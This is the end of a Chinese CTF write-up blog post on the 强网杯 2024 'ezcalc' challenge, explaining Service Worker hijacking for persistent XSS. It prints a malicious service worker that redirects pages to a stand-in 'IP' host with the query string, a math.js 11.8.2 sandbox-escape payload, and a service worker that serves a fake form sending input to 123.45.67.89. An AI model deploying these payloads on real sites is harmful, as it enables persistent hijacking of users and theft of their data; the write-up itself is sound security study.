+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iyiyang/articles/11641904.html">XSS持久化劫持之ServiceWorker - 镱鍚 - 博客园</a>  这篇博客写了具体的操作流程。可以对这篇博客进一步优化，jsonp请求参数设置成 importScripts(&#x2F;&#x2F;a.com&#x2F;xx.js)&#x2F;&#x2F; 来注释返回内容不需要的部分。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/jsonp.php?callback=test</span><br><span class="line"></span><br><span class="line">HTTP/1.1</span><br><span class="line">200 OK</span><br><span class="line">Content-Type:</span><br><span class="line">text/javascript; charset=UTF-8</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">test(&#123;[...]&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><code>setInterval</code> 方法设置了一个定时器</p>
+<h4 id="恶意sw实例"><a href="#恶意sw实例" class="headerlink" title="恶意sw实例"></a>恶意sw实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#x27;install&#x27;,function(event)&#123;</span><br><span class="line">  // Skip waiting so the SW activates immediately on install</span><br><span class="line">    self.skipWaiting();</span><br><span class="line">    console.log(&#x27;install ok!&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&#x27;activate&#x27;, event =&gt; &#123;</span><br><span class="line">  // Activate immediately after installation</span><br><span class="line">    event.waitUntil(self.clients.claim());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;fetch&#x27;,function(event)&#123;</span><br><span class="line">    console.log(event.request);</span><br><span class="line">    event.respondWith(</span><br><span class="line">    caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        return new Response(&#x27;&lt;script&gt;location=&quot;http://IP?&quot;+btoa(location.search)&lt;/script&gt;&#x27;, &#123;headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="qwb-ezcalc-注入sw"><a href="#qwb-ezcalc-注入sw" class="headerlink" title="qwb ezcalc 注入sw"></a>qwb ezcalc 注入sw</h3><p>有文件上传点，且利用&#x2F;static解析中间件的解析漏洞， navigator.serviceWorker.register(‘&#x2F;staticsw.js’)可以让我们控制sw的scope为整个根域，进而劫持bot对app的访问及flag的输入。</p>
+<p>问题是，我们怎么显示的去让bot调用navigator.serviceWorker.register。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/85/#EzCalc">强网杯 2024 By W&amp;M - W&amp;M Team</a></p>
+<p>math.js version 11.8.2 存在rce</p>
+<p>我们在页面中输入的执行的expr ，同样会被bot执行一遍。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// could execute a nodejs script like &quot;return process.mainModule.require(child_process).execSync(whoami)&quot;</span><br><span class="line">const result = math.evaluate(&#x27;evalFunctionNode=parse(&quot;constructor(\&#x27;return process.version\&#x27;)&quot;)._compile(&#123;&#125;,&#123;&#125;);&#x27; +</span><br><span class="line">  &#x27;f=evalFunctionNode(null,cos);&#x27; +</span><br><span class="line">  &#x27;f()&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>有一个小问题，原payload里面的evalFunctionNode 在页面引入的js中被压缩成了e</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="title function_">parse</span>(<span class="string">&quot;constructor(&#x27;d=()=&gt;document.querySelector(`.ant-alert-message`);setInterval(()=&gt;&#123;if(d())d().innerHTML=114514&#125;,100);alert(1)&#x27;)&quot;</span>).<span class="title function_">_compile</span>(&#123;&#125;,&#123;&#125;);f=<span class="title function_">e</span>(<span class="literal">null</span>,cos);<span class="title function_">f</span>()</span><br></pre></td></tr></table></figure>
+
+<p>成功劫持。</p>
+<p>W&amp;M的wp里sw.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;installedstart&quot;);</span><br><span class="line">self.addEventListener(&#x27;install&#x27;, event =&gt; &#123;</span><br><span class="line">  // Skip waiting so the SW activates immediately on install</span><br><span class="line">  self.skipWaiting();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;activate&#x27;, event =&gt; &#123;</span><br><span class="line">  // Activate immediately after installation</span><br><span class="line">  event.waitUntil(self.clients.claim());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const html = `</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;input id=&quot;expr&quot; placeholder=&quot;Math Expression&quot; class=&quot;ant-input css-ni1kz0 ant-input-outlined ant-input-compact-item ant-input-compact-first-item&quot; type=&quot;text&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;button id=&quot;calc&quot; type=&quot;button&quot; class=&quot;ant-btn css-ni1kz0 ant-btn-primary ant-btn-color-primary ant-btn-variant-solid ant-btn-compact-item ant-btn-compact-last-item&quot;&gt;&lt;span&gt;Calculate&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">calc.onclick = function()&#123;</span><br><span class="line">window.location.href = &quot;http://123.45.67.89:9990/flag?flag=&quot;+encodeURI(expr.value)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">`;</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;fetch&#x27;, event =&gt; &#123;</span><br><span class="line">console.log(event);</span><br><span class="line">  // Intercept the request for /index.html</span><br><span class="line">  if (event.request.url.endsWith(&#x27;/&#x27;)) &#123;</span><br><span class="line">    event.respondWith(</span><br><span class="line">      new Response(html, &#123;</span><br><span class="line">        headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>添加了一些操作，例如skipWaiting ， event.waitUntil(self.clients.claim())。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/09/09/windows%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="prev" title="windows常见提权漏洞总结.md">
+      <i class="fa fa-chevron-left"></i> windows常见提权漏洞总结.md
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/11/10/ByteCTF2024_ezauth/" rel="next" title="bytectf2024 ezauth">
+      bytectf2024 ezauth <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E5%BC%BA%E7%BD%91%E6%9D%AF2024-ezcalc%E5%AD%A6service-worker"><span class="nav-number">1.</span> <span class="nav-text">从强网杯2024_ezcalc学service-worker</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#app"><span class="nav-number">1.2.1.</span> <span class="nav-text">app</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">初始化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#static"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">&#x2F;static</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#api-screen-upload"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">&#x2F;api&#x2F;screen&#x2F;upload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#api-report"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">&#x2F;api&#x2F;report</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bot"><span class="nav-number">1.2.2.</span> <span class="nav-text">bot</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#api-bot"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">&#x2F;api&#x2F;bot</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#service-worker"><span class="nav-number">1.4.</span> <span class="nav-text">service-worker</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B-%E6%8C%81%E4%B9%85%E5%8C%96xss%E5%9F%BA%E7%A1%80-%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA"><span class="nav-number">1.4.1.</span> <span class="nav-text">浏览器模型 持久化xss基础 - 先知社区</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BD%9C%E5%9C%A8%E6%94%BB%E5%87%BB%E7%82%B91-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%AB%E6%8C%81sw-js-sw-registration-js"><span class="nav-number">1.4.2.</span> <span class="nav-text">潜在攻击点1 文件上传劫持sw.js&#x2F;sw-registration.js</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%82%B92-Jsonp%E6%B3%A8%E5%86%8Csw"><span class="nav-number">1.4.3.</span> <span class="nav-text">攻击点2 Jsonp注册sw</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%B6%E6%84%8Fsw%E5%AE%9E%E4%BE%8B"><span class="nav-number">1.4.4.</span> <span class="nav-text">恶意sw实例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qwb-ezcalc-%E6%B3%A8%E5%85%A5sw"><span class="nav-number">1.5.</span> <span class="nav-text">qwb ezcalc 注入sw</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Charger0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Charger0</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
